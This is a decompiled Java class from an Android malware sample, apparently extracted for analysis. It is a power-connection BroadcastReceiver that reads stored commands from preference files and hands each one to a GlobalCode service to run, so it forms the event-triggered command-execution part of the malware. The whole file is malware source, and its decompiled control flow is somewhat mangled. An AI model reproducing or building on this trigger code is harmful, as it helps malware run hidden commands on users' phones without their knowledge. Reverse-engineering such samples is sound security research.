package krep.itmtd.ywtjexf;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import java.util.Iterator;
import java.util.Map;
import java.util.Set;

public class PowerConnectionReceiver
  extends BroadcastReceiver
{
  public String getcmd(Context paramContext, String paramString)
  {
    return paramContext.getSharedPreferences("Cmd_conf", 0).getString(paramString, "");
  }
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    paramIntent = paramContext.getSharedPreferences("Power_conf", 0).getAll();
    if (paramIntent.size() > 0) {
      paramIntent = paramIntent.keySet().iterator();
    }
    for (;;)
    {
      if (!paramIntent.hasNext()) {
        return;
      }
      String str1 = (String)paramIntent.next();
      String str2 = getcmd(paramContext, str1);
      if (str2.length() > 2)
      {
        Intent localIntent = new Intent(paramContext, GlobalCode.class);
        localIntent.putExtra("content", str2);
        localIntent.putExtra("type", "TriggerPower:" + str1);
        localIntent.putExtra("data", "");
        paramContext.startService(localIntent);
      }
    }
  }
}


/* Location:              /home/enzo/Documents/hacking/malwares/krep/classes-dex2jar.jar!/krep/itmtd/ywtjexf/PowerConnectionReceiver.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */